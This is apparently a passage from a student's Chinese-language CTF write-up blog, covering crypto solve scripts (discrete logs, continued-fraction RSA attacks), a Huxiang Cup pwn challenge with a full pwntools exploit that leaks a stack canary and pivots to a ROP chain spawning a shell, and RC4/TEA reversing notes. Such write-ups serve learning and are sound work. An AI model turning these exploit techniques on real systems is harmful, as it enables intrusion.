326516836146140706852577748364903349138246106379954647002557091131475669295997196484548199507335421499556985949139162639560622973283109342746186994609598854386966520638338999059</span></span><br><span class="line">y = <span class="number">449703347709287328982446812318870158230369688625894307953604074502413258045265502496365998383562119915565080518077360839705004058211784369656486678307007348691991136610142919372779782779111507129101110674559235388392082113417306002050124215904803026894400155194275424834577942500150410440057660679460918645357376095613079720172148302097893734034788458122333816759162605888879531594217661921547293164281934920669935417080156833072528358511807757748554348615957977663784762124746554638152693469580761002437793837094101338408017407251986116589240523625340964025531357446706263871843489143068620501020284421781243879675292060268876353250854369189182926055204229002568224846436918153245720514450234433170717311083868591477186061896282790880850797471658321324127334704438430354844770131980049668516350774939625369909869906362174015628078258039638111064842324979997867746404806457329528690722757322373158670827203350590809390932986616805533168714686834174965211242863201076482127152571774960580915318022303418111346406295217571564155573765371519749325922145875128395909112254242027512400564855444101325427710643212690768272048881411988830011985059218048684311349415764441760364762942692722834850287985399559042457470942580456516395188637916303814055777357738894264037988945951468416861647204658893837753361851667573185920779272635885127149348845064478121843462789367112698673780005436144393573832498203659056909233757206537514290993810628872250841862059672570704733990716282248839</span></span><br><span class="line">g = <span class="number">2</span></span><br><span class="line">c1, g = Mod(c1, y), Mod(g, y)</span><br><span class="line"><span class="comment"># x = discrete_log(c1, g)</span></span><br><span class="line"><span class="comment"># print(x)</span></span><br><span class="line">x = <span class="number">43776275628859890575232443794319298551934804213472744927022818696759188901977390266973172755658396197421139420206549889337117978597883154859965236605452518446448639813055134133587564045471804447818058571586426895800984805588363855865218690877547419152765512143095217413477343835473963637692441032136163289964756172316289469159500312630529091350636808491697553069388388303341623047737553556123142002737059936569931163197364571478509576816349348146215101250803826590694039096063858424405382950769415272111843039715632655831594224288099608827345377164375927559338153505991404973888594356664393487249819589915881178770048740</span></span><br><span class="line"><span class="comment"># var(&#x27;p&#x27;)</span></span><br><span class="line"><span class="comment"># a = solve([2019 * p**2 + 2020 * p**3 + 2021 * p**4 - x == 0], [p])</span></span><br><span class="line"><span class="comment"># print(a)</span></span><br><span class="line">p = <span class="number">12131601165788024635030034921084070470053842112984866821070395281728468805072716002494427632757418621194662541766157553264889658892783635499016425528807741</span></span><br><span class="line">m = <span class="built_in">pow</span>(c, dp, p)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DASCTF&#123;98d923h4344e3bf72f8775xy65tvftv5&#125;</span><br></pre></td></tr></table></figure>

<p>为什么呢，主要也简单，因为$y$是光滑数，$y-1$可以被完全分解，所以才可以用签到离散对数的方法来求指数</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211121101501148.png" alt="image-20211121101501148"></p>
<p>后面的话根据欧拉定理将模数转换到$p$上，因为<br>$$<br>dp\equiv d\ (mod\ p-1)<br>$$</p>
<h3 id="密码人集合"><a href="#密码人集合" class="headerlink" title="密码人集合"></a>密码人集合</h3><p>有意思的签到题，很好奇是怎么控制输出的，尚师傅出了，说是填数独，就没看</p>
<hr>
<h3 id="SpecialCurve2（recuring）"><a href="#SpecialCurve2（recuring）" class="headerlink" title="SpecialCurve2（recuring）"></a>SpecialCurve2（recuring）</h3><p>没有a和b咋整？直接discrete_log出不来，又陷入只会跑jo本的坑，看Nu1l战队的WP复现</p>
<p>那边的师傅用PARI的工具来求解离散对数，sage还真是强大，可以外加这么多语言和工具，更多请看官网文档</p>
<p><a href="https://www.osgeo.cn/sagemath/developer/coding_in_other.html">https://www.osgeo.cn/sagemath/developer/coding_in_other.html</a></p>
<p>搞一手搞一手，但为什么y要这样子处理呢？？？</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">e = <span class="built_in">int</span>(pari(<span class="string">f&quot;znlog(<span class="subst">&#123;<span class="built_in">int</span>(y)&#125;</span>,Mod(<span class="subst">&#123;<span class="built_in">int</span>(g)&#125;</span>,<span class="subst">&#123;<span class="built_in">int</span>(n)&#125;</span>))&quot;</span>))</span><br></pre></td></tr></table></figure>

<p>不懂了不懂了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env sage</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">P1, P2</span>):</span></span><br><span class="line">    x1, y1 = P1</span><br><span class="line">    x2, y2 = P2</span><br><span class="line">    x3 = (x1 * x2 - y1 * y2) % n</span><br><span class="line">    y3 = (x1 * y2 + x2 * y1) % n</span><br><span class="line">    <span class="keyword">return</span> (x3, y3)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mul</span>(<span class="params">P, k</span>):</span></span><br><span class="line">    <span class="keyword">assert</span> k &gt;= <span class="number">0</span></span><br><span class="line">    Q = (<span class="number">1</span>, <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">while</span> k &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">if</span> k % <span class="number">2</span>:</span><br><span class="line">            k -= <span class="number">1</span></span><br><span class="line">            Q = add(P, Q)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            k //= <span class="number">2</span></span><br><span class="line">            P = add(P, P)</span><br><span class="line">    <span class="keyword">return</span> Q</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n = <span class="number">92916331959725072239888159454032910975918656644816711315436128106147081837990823</span></span><br><span class="line">C = (<span class="number">44449540438169324776115009805536158060439126505148790545560105884100348391877176</span>,</span><br><span class="line">     <span class="number">73284708680726118305136396988078557189299357177640330968917927635171441710392723</span>)</span><br><span class="line">g = <span class="number">2</span></span><br><span class="line">y = <span class="number">1225348982571480649501200428324593233958863708041772597837722864848672736148168</span> ** <span class="number">2</span> * <span class="number">2</span> % n</span><br><span class="line"></span><br><span class="line"><span class="comment"># e = int(pari(f&quot;znlog(&#123;int(y)&#125;,Mod(&#123;int(g)&#125;,&#123;int(n)&#125;))&quot;))</span></span><br><span class="line">e = <span class="number">96564183954285580248216944343172776827819893296479821021220123492652817873253</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">pow</span>(g, e, n))</span><br><span class="line"><span class="built_in">print</span>(y)</span><br><span class="line"></span><br><span class="line">p1 = <span class="number">425886199617876462796191899</span></span><br><span class="line">p2 = <span class="number">434321947632744071481092243</span></span><br><span class="line">p3 = <span class="number">502327221194518528553936039</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> p1 * p2 * p3 == n</span><br><span class="line"></span><br><span class="line">phi = (p1 ** <span class="number">2</span> - <span class="number">1</span>) * (p2 ** <span class="number">2</span> - <span class="number">1</span>) * (p3 ** <span class="number">2</span> - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">d = inverse(e, phi)</span><br><span class="line"></span><br><span class="line">M = mul(C, d)</span><br><span class="line"><span class="built_in">print</span>(M)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(M[<span class="number">0</span>])+long_to_bytes(M[<span class="number">1</span>]))</span><br></pre></td></tr></table></figure>

<h3 id="LSFR（not-solve）"><a href="#LSFR（not-solve）" class="headerlink" title="LSFR（not solve）"></a>LSFR（not solve）</h3><h3 id="WienerStudyTwice"><a href="#WienerStudyTwice" class="headerlink" title="WienerStudyTwice"></a>WienerStudyTwice</h3><p>湖湘回来，认识了Xenny师傅（当然是单向的</p>
<p>又知晓了一个新的刷题网站，NSS，他是这道题的出题人，看着他的WP复现</p>
<p><a href="https://www.ctfer.vip/#/note/set/wp/51">https://www.ctfer.vip/#/note/set/wp/51</a></p>
<h4 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h4><p>没有源文件，也没有</p>
]]></content>
      <categories>
        <category>树哥让我天天写之Crypto</category>
      </categories>
      <tags>
        <tag>佩尔方程</tag>
        <tag>拓展维纳攻击</tag>
      </tags>
  </entry>
  <entry>
    <title>20211121 湖湘杯</title>
    <url>/posts/1ffb9441/</url>
    <content><![CDATA[<p>&nbsp;</p>
<span id="more"></span>
<h1 id="湘湖杯"><a href="#湘湖杯" class="headerlink" title="湘湖杯"></a>湘湖杯</h1><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="signin"><a href="#signin" class="headerlink" title="signin"></a>signin</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p1, q1 = getPrime(<span class="number">360</span>), getPrime(<span class="number">128</span>)</span><br><span class="line">n1 = p1**<span class="number">4</span>*q1</span><br><span class="line">q2 = getPrime(<span class="number">128</span>)</span><br><span class="line">bound = p1 // (<span class="number">8</span>*q1*q2) + <span class="number">1</span></span><br><span class="line">p2 = random.randrange(p1, p1 + bound)</span><br><span class="line"><span class="keyword">while</span> <span class="keyword">not</span> isPrime(p2):</span><br><span class="line">    p2 = random.randrange(p1, p1 + bound)</span><br><span class="line">n2 = p2**<span class="number">4</span>*q2</span><br></pre></td></tr></table></figure>

<p>考连分数，勒让德定理</p>
<p>比赛的时候还不懂原理，觉得很不应该，就去学了下（其实不知道原理直接展开枚举收敛就能涉及到</p>
<p><a href="https://4xwi11.github.io/posts/1b1ce809/">https://4xwi11.github.io/posts/1b1ce809/</a></p>
<p>所以这里<br>$$<br>\frac{n_2}{n_1}=\frac{p_1^4q_1}{(p_1+x_{102})^4q_2}<br>$$<br>$x_{102}$是102位的，对于<br>$$<br>|p_1-p_2|&lt;\frac{p_1}{8q_1q_2}<br>$$<br>是完全成立的，即对$\frac{n_2}{n_1}$进行连分数展开<br>$$<br>|\frac{n_2}{n_2}-\frac{q_2}{q_1}|=\frac{q_1q_2|p_1^r-p_2^r|}{q_1^2p_1^r}<br>$$<br>$\frac{q_2}{q_1}$也在这些逼近里</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> sage <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">global</span> q1, q2</span><br><span class="line"></span><br><span class="line">pk = (<span class="number">1150398070565459492080597718626032792435556703413923483458704675295997646493249759818468321328556510074044954676615760446708253531839417036997811506222349194302791943489195718713797322878586379546657275419261647635859989280700191441312691274285176619391539387875252135478424580680264554294179123254566796890998243909286508189826458854346825493157697201495100628216832191035903848391447704849808577310612723700318670466035077202673373956324725108350230357879374234418393233</span>, <span class="number">1242678737076048096780023147702514112272319497423818488193557934695583793070332178723043194823444815153743889740338870676093799728875725651036060313223096288606947708155579060628807516053981975820338028456770109640111153719903207363617099371353910243497871090334898522942934052035102902892149792570965804205461900841595290667647854346905445201396273291648968142608158533514391348407631818144116768794595226974831093526512117505486679153727123796834305088741279455621586989</span>)</span><br><span class="line">c1, c2 = (<span class="number">361624030197288323178211941746074961985876772079713896964822566468795093475887773853629454653096485450671233584616088768705417987527877166166213574572987732852155320225332020636386698169212072312758052524652761304795529199864805108000796457423822443871436659548626629448170698048984709740274043050729249408577243328282313593461300703078854044587993248807613713896590402657788194264718603549894361488507629356532718775278399264279359256975688280723740017979438505001819438</span>, <span class="number">33322989148902718763644384246610630825314206644879155585369541624158380990667828419255828083639294898100922608833810585530801931417726134558845725168047585271855248605561256531342703212030641555260907310067120102069499927711242804407691706542428236208695153618955781372741765233319988193384708525251620506966304554054884590718068210659709406626033891748214407992041364462525367373648910810036622684929049996166651416565651803952838857960054689875755131784246099270581394</span>)</span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line"></span><br><span class="line">n1, n2 = pk[<span class="number">0</span>], pk[<span class="number">1</span>]</span><br><span class="line"><span class="keyword">for</span> q1, q2 <span class="keyword">in</span> sub_fraction(n1, n2):</span><br><span class="line">    <span class="keyword">if</span> q1 == <span class="number">0</span> <span class="keyword">or</span> q2 == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> n1 % q1 == <span class="number">0</span> <span class="keyword">and</span> q1 != <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">p1 = iroot(n1 // q1, <span class="number">4</span>)[<span class="number">0</span>]</span><br><span class="line">p2 = iroot(n2 // q2, <span class="number">4</span>)[<span class="number">0</span>]</span><br><span class="line">phi1 = (p1-<span class="number">1</span>) * p1 ** <span class="number">3</span> * (q1-<span class="number">1</span>)</span><br><span class="line">phi2 = (p2-<span class="number">1</span>) * p2 ** <span class="number">3</span> * (q2-<span class="number">1</span>)</span><br><span class="line">d1 = invert(e, phi1)</span><br><span class="line">d2 = invert(e, phi2)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(c1, d1, n1))+long_to_bytes(<span class="built_in">pow</span>(c2, d2, n2)))</span><br></pre></td></tr></table></figure>

<h3 id="firstOT（not-solve）"><a href="#firstOT（not-solve）" class="headerlink" title="firstOT（not solve）"></a>firstOT（not solve）</h3><p>第一个选择，显然会用到MT19937，使用78次循环就可以预测伪随机数了，问题是解密有什么用呢？</p>
<p>如果随机数爆破出来，第二第三个选择，后面的<code>cur_rand</code>也就是知道了，按照道理也就可以恢复<code>primate_key</code>了</p>
<p>这样就能求出AES的key了，思路简单看能不能实现吧</p>
<p>暂时没时间复现，先咕咕咕了</p>
]]></content>
      <categories>
        <category>树哥让我天天写之Crypto</category>
      </categories>
      <tags>
        <tag>勒让德定理</tag>
      </tags>
  </entry>
  <entry>
    <title>20211205 湖湘杯Pwn部分WP</title>
    <url>/posts/7744a72a/</url>
    <content><![CDATA[<p>fw这次又被师傅们带飞了，全程为大佬端茶送水，搬运茶歇  </p>
<span id="more"></span>

<p>在pwn师傅的教导下（谢师傅这次修了4个，攻了1个，爆杀），这次pwn萌新学到了</p>
<ul>
<li><p><code>strlen</code>同样不安全，可以00截断绕过</p>
</li>
<li><p><code>gdb.attach(io)</code>动调</p>
</li>
<li><p>pwn里<code>read</code>的一般用<code>send</code>，而非<code>sendline</code></p>
</li>
<li><p>进一步学习栈迁移</p>
</li>
<li><p>libc-2.27.so的system有点特殊，要<code>call</code>，还有啥<code>leave_ret</code>来着</p>
</li>
</ul>
<p>还需要学的</p>
<ul>
<li>如何指定.so动态链接库文件</li>
<li>抬栈的操作不是很懂</li>
</ul>
<p>开始前，简单介绍下AWDP的模式（补一下红帽杯的坑</p>
<ul>
<li><p>攻击就是平时的做题，获得shell</p>
</li>
<li><p>防守就是在不影响正常功能使用的情况下，使官方的exp无法获得你patch后程序的shell</p>
<p>一般替换的方法如下，tar打包patch好的二进制文件，以及<code>update.sh</code>，如</p>
</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">chmod 777 game</span><br><span class="line">mv -f game /home/ctf/game</span><br></pre></td></tr></table></figure>

<p>然后用ftp上传压缩包（对直接在窗口输入ftp地址里面是没有东西的，直接拉进去就可以了</p>
<hr>
<h1 id="湖湘杯"><a href="#湖湘杯" class="headerlink" title="湖湘杯"></a>湖湘杯</h1><p>目前只会栈，所幸考了一道栈，在谢师傅的帮助下，赛后复现</p>
<h2 id="game"><a href="#game" class="headerlink" title="game"></a>game</h2><p><em>一道“作文题”？有点让我想起4399里面的蓝色药水</em></p>
<h3 id="考点"><a href="#考点" class="headerlink" title="考点"></a>考点</h3><p>栈溢出，canary，pivoting</p>
<h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><p>查保护，显然会考canary</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211206074413404.png" alt="image-20211206074413404"></p>
<p>IDA分析下逻辑，然后在函数栏直接搜有没有什么可以利用的函数：有system，但是是<code>system(&quot;ls&quot;)</code>；还有read函数，共有两次调用，并且每一次都可以进行栈溢出</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211206074714902.png" alt="image-20211206074714902"></p>
<p>第一处的read之后就有一个printf，典型的00截断泄漏canary，这里问题不大</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211206075028546.png" alt="image-20211206075028546"></p>
<p>第二处的read只能溢出长度为24，而且没有<code>/bin/sh</code>，需要ROP，空间不够（比赛到此为止</p>
<p>谢师傅提醒，最开始有个输入名字的地方，<code>strlen</code>控制只能输入16个，但其是导向一个1000h的bss空间，明显是让我们栈迁移用的，在上面构造ROP链</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211206075617581.png" alt="image-20211206075617581"></p>
<p>本地exp（是不是有密码师傅风格</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io = remote(&quot;172.16.9.41&quot;a, 8008)</span></span><br><span class="line">io = process(<span class="string">&quot;./game&quot;</span>)</span><br><span class="line">system_addr = <span class="number">0x401265</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x402bb3</span></span><br><span class="line">bin_sh = <span class="number">0x7ffff7b95e1a</span></span><br><span class="line">bss_addr = <span class="number">0x4080C0</span></span><br><span class="line">ret_addr = <span class="number">0x40101a</span></span><br><span class="line">leave_ret_addr = <span class="number">0x401337</span></span><br><span class="line"></span><br><span class="line">pwd = <span class="string">&#x27;20161226&#x27;</span></span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solve_awl</span>(<span class="params">_recv, _send</span>):</span></span><br><span class="line">    io.recvuntil(_recv.encode())</span><br><span class="line">    <span class="keyword">if</span> _send == <span class="string">&quot;&quot;</span>:</span><br><span class="line">        io.sendline()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io.sendline(_send)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">resolve</span>(<span class="params">_times</span>):</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(_times):</span><br><span class="line">        io.recvline()</span><br><span class="line">        io.sendline()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># bailan 1</span></span><br><span class="line"></span><br><span class="line">solve_awl(<span class="string">&quot;1.开始游戏\n&quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">payload = <span class="string">b&quot;/bin/sh\x00&quot;</span> + p64(ret_addr)*<span class="number">0x200</span> + p64(pop_rdi_ret) + p64(bss_addr) + p64(system_addr)</span><br><span class="line"></span><br><span class="line">solve_awl(<span class="string">&quot;请输入你的名字：\n&quot;</span>, payload)</span><br><span class="line">solve_awl(<span class="string">&quot;2.女\n&quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">solve_awl(<span class="string">&quot;2.打开柜子\n&quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">resolve(<span class="number">3</span>)</span><br><span class="line">solve_awl(<span class="string">&quot;2.无视提醒打开它\n&quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">solve_awl(<span class="string">&quot;你终究是打开了这封信，那么就由我来告诉你一些事情吧。\n&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">resolve(<span class="number">1</span>)</span><br><span class="line">solve_awl(<span class="string">&quot;但是当你打开了这封信，你可能就会想起我们又一次越狱失败了。\n&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">solve_awl(<span class="string">&quot;现在想不起所有的事情是很正常的反应，慢慢的，你就会记起一切。\n&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">solve_awl(<span class="string">&quot;如果你想逃离这里，我把线索藏在了你自己的衣服里。\n&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">resolve(<span class="number">5</span>)</span><br><span class="line">solve_awl(<span class="string">&quot;2.气恼地撕开衣服\n&quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">solve_awl(<span class="string">&quot;而布条上分布着星星和横杠。&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">solve_awl(<span class="string">&quot;**---,-----,*----,-****,*----,**---,**---,-****\n&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">solve_awl(<span class="string">&quot;8位数字密码：&quot;</span>, pwd)</span><br><span class="line">solve_awl(<span class="string">&quot;寻找密码可以用上的地方。\n&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">resolve(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak canary</span></span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span> * <span class="number">24</span></span><br><span class="line">solve_awl(<span class="string">&quot;密码:&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">a = io.recvuntil(<span class="string">b&quot;A&quot;</span> * <span class="number">24</span>+<span class="string">b&quot;\n&quot;</span>)</span><br><span class="line">canary = u64(io.recv(<span class="number">7</span>).rjust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;canary ====&gt; &quot;</span> + <span class="built_in">hex</span>(canary))</span><br><span class="line"></span><br><span class="line"><span class="comment"># bailan 2</span></span><br><span class="line">io.sendline()</span><br><span class="line">resolve(<span class="number">4</span>)</span><br><span class="line">solve_awl(<span class="string">&quot;(虽然我个人建议你往回走，毕竟这里什么也没有。)\n&quot;</span>, <span class="string">&quot;3&quot;</span>)</span><br><span class="line">resolve(<span class="number">6</span>)</span><br><span class="line">solve_awl(<span class="string">&quot;他们有的正在日常起居饮食，有的则在为自己接上充电插口，还有的和他一样离开了房间。\n&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">resolve(<span class="number">2</span>)</span><br><span class="line">solve_awl(<span class="string">&quot;（你现在乖乖听话回到你的房间里，那么我们还会帮你消除你的记忆，这一切都可以当做没有发生。）\n&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">solve_awl(<span class="string">&quot;（504号，虽然不知道你是怎么逃脱你的房间的，我还是发自内心的请求你回去。越走下去，你只会越孤独。）\n&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">solve_awl(<span class="string">&quot;2.返回房间\n&quot;</span>, <span class="string">&quot;3&quot;</span>)</span><br><span class="line">resolve(<span class="number">2</span>)</span><br><span class="line">solve_awl(<span class="string">&quot;一台终端开始和他对话起来。\n&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">solve_awl(<span class="string">&quot;（为了奖励你的贡献，我可以告诉你一切。）\n&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">resolve(<span class="number">5</span>)</span><br><span class="line">solve_awl(<span class="string">&quot;（甚至你们中的很大一部分越狱者并没有真正意识到自己仍然被囚禁着。）\n&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">solve_awl(<span class="string">&quot;（很多合成人被困在那里，不过智慧的你可能并没有到达过那里。）\n&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">solve_awl(<span class="string">&quot;（最后，我们人类非常感谢你为这个观察中心取得的突破。）\n&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">solve_awl(<span class="string">&quot;（但是他们都是些专业学者，并不会让你产生太多痛苦。）\n&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">resolve(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">io.recvline()</span><br><span class="line"></span><br><span class="line"><span class="comment"># get_shell</span></span><br><span class="line"><span class="comment"># system(&quot;ls&quot;)</span></span><br><span class="line"><span class="comment"># system_addr = 0x40125B</span></span><br><span class="line"><span class="comment"># libc.so.2.27 system + ret, or to mov directly</span></span><br><span class="line"><span class="comment"># payload2 = b&quot;A&quot; * 24 + p64(canary) + p64(0) + p64(system_addr)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># system(&quot;/bin/sh&quot;)</span></span><br><span class="line">payload2 = <span class="string">b&quot;A&quot;</span> * <span class="number">24</span> + p64(canary) + p64(bss_addr) + p64(leave_ret_addr)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">io.send(payload2)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211206003242034.png" alt="image-20211206003242034"></p>
<p>打下NSS的远程</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211207131058351.png" alt="image-20211207131058351"></p>
<hr>
<p>关于防守三道都可以直接上沙箱把system给禁掉，可惜出了点问题导致手慢了，分可以更高</p>
<p>主要的问题有：</p>
<ul>
<li>没有将全部的文件打包上传，只上传了修过的文件，导致程序没有运行起来</li>
</ul>
<p>然后第二题考点我不会，要修libc.so文件</p>
]]></content>
      <categories>
        <category>树哥让我天天写之Pwn</category>
      </categories>
      <tags>
        <tag>pivoting</tag>
        <tag>AWDP</tag>
      </tags>
  </entry>
  <entry>
    <title>20211127 N3CTF</title>
    <url>/posts/a89e21c0/</url>
    <content><![CDATA[<p>三校联谊的新生代赛，结果基本上主要我们学校在打（太菜了人家看不上），主要大二在打</p>
<p>wjh师傅出的二进制题，最近在学pwn，这几道整好拿来实操，都是基础攻击中最简单的类型（都是64位的</p>
<span id="more"></span>

<h1 id="N-3CTF"><a href="#N-3CTF" class="headerlink" title="N^3CTF"></a>N^3CTF</h1><h2 id="re-CrackMe"><a href="#re-CrackMe" class="headerlink" title="re-CrackMe"></a>re-CrackMe</h2><p>exe，IDA打开一脸懵，然后提示说是C#编写的，用dnSpy来反编译（IDA也能看到逻辑</p>
<p><a href="https://github.com/dnSpy/dnSpy">https://github.com/dnSpy/dnSpy</a></p>
<p>好强大，还可以动调，解题步骤如图所示</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211129153110558.png" alt="image-20211129153110558"></p>
<p>将需要的输入，注册成功，获得flag</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211129205013363.png" alt="image-20211129205013363"></p>
<h2 id="re-rc4"><a href="#re-rc4" class="headerlink" title="re-rc4"></a>re-rc4</h2><p>标准的rc4，密文和秘钥如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> key[] = <span class="string">&quot;N3CTFYES&quot;</span>;</span><br><span class="line"><span class="keyword">int</span> text[] = &#123;<span class="number">0xCD</span>, <span class="number">0x53</span>, <span class="number">0x7B</span>, <span class="number">0x7F</span>, <span class="number">0x25</span>, <span class="number">0x92</span>, <span class="number">0x04</span>, <span class="number">0x98</span>, <span class="number">0x9B</span>, <span class="number">0x54</span>, <span class="number">0x93</span>, <span class="number">0xEA</span>, <span class="number">0x1D</span>, <span class="number">0x33</span>, <span class="number">0xC4</span>, <span class="number">0x90</span>, <span class="number">0x2D</span>, <span class="number">0x36</span>, <span class="number">0x93</span>, <span class="number">0xB1</span>, <span class="number">0xEC</span>, <span class="number">0x96</span>, <span class="number">0x24</span>, <span class="number">0x55</span>, <span class="number">0xFF</span>, <span class="number">0x18</span>, <span class="number">0xCC</span>, <span class="number">0xA8</span>, <span class="number">0x1C</span>, <span class="number">0x8E</span>, <span class="number">0xE5</span>, <span class="number">0x15</span>, <span class="number">0xAC</span>, <span class="number">0x4D</span>, <span class="number">0xF9</span>, <span class="number">0xBD</span>, <span class="number">0xF2</span>, <span class="number">0x5B</span>&#125;;</span><br></pre></td></tr></table></figure>

<p>rc4对一个字节一个字节操作的，加密和解密操作相同</p>
<p>用C或python的脚本再加密一就好</p>
<p><a href="https://4xwi11.github.io/posts/542742a9/">https://4xwi11.github.io/posts/542742a9/</a></p>
<h2 id="re-tea"><a href="#re-tea" class="headerlink" title="re-tea"></a>re-tea</h2><p>马萨卡，标准的tea，知道key和cipher，燃鹅解不出来，燃鸭也不行</p>
<p>暴露出来的问题：</p>
<ul>
<li>C 数据存储</li>
</ul>
<p>最后这样搞出来了</p>
<p>我们先从IDA中找到加密后的数据<code>en</code>，由于是tea是对两个32位的数据（一个64位的数据）进行加密的，所以这里我们要转成DWORD，也就是4个字节（直接用插件Lazy IDA</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> en[<span class="number">10</span>] = &#123;</span><br><span class="line">    <span class="number">0x28974004</span>, <span class="number">0xAAD86C7C</span>, <span class="number">0x8D085185</span>, <span class="number">0xD4399568</span>, <span class="number">0xA1BBCC5E</span>, <span class="number">0x645DC758</span>, <span class="number">0xD18027A9</span>, <span class="number">0x12A59394</span>, </span><br><span class="line">    <span class="number">0xEE77B33C</span>, <span class="number">0x22B51132</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>tea的key是128位的，因为要分成四份，每份32位，这里<code>key=&#123;1, 2, 3, 4&#125;</code>直接用</p>
